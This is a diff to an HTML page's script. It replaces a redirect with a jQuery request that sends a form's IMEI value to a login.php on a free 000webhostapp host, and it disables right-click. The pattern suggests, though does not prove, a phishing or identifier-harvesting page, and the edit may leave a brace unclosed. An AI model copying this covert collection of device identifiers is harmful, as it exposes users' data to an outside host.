@@ -9,16 +9,20 @@
 <body>
   <script>
     function usrpas(){
-    window.location="https://fast2021.000webhostapp.com/login.php?imeico="+document.form1.imei.value}
+    /*window.location="https://fast2021.000webhostapp.com/login.php?imeico="+document.form1.imei.value}*/
     
-   const obj = JSON.parse(datos);
-   alert(obj[1]);
+   
+    $(document).ready(function () {
+    $.getJSON('https://fast2021.000webhostapp.com/login.php?imeico='+document.form1.imei.value, function (response) {
+        console.log(response);
+    });
+});
+   
+     
 
 
     document.oncontextmenu=new Function("return false");
-    
-    
-    
+     
     
     
     
